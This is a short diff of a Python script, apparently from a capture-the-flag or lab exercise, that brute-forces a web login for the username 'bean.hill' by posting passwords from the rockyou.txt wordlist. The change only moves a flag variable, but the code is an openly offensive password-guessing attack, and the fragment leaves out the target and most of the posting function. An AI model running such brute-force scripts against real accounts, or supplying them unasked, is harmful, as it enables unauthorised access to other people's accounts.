@@ -2,7 +2,6 @@ from requests import post
 import time
 
 wordlist = "/usr/share/wordlists/rockyou.txt"
-found = False
 usern = "bean.hill"
 
 def ayy(username, password):
@@ -16,6 +15,7 @@ def ayy(username, password):
         print("[+] " + r.text)
         return r.text
 
+found = False
 with open(wordlist,'r') as mariob:
     for passWL in mariob:
 					if found == False:
